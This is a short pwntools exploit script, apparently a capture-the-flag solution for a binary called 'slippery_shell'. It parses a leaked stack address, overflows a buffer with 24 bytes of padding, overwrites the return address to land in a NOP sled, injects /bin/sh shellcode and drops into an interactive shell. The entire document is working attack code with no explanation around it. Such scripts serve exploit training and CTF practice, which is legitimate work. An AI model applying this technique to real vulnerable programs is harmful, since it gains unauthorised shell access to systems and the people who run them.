from pwn import *

binary = context.binary = ELF("./slippery_shell")

if args.REMOTE:
    p = remote()
else:
    p = process(binary.path)

leak = int(p.recvline().split(b"is ")[1].rstrip(), 16)

payload = b''
payload += b"A"*24
payload += p64(leak + 40)
payload += b'\x90'*100
payload += asm(shellcraft.sh())

p.sendlineafter(b"Please enter your name! ",payload)

p.interactive()

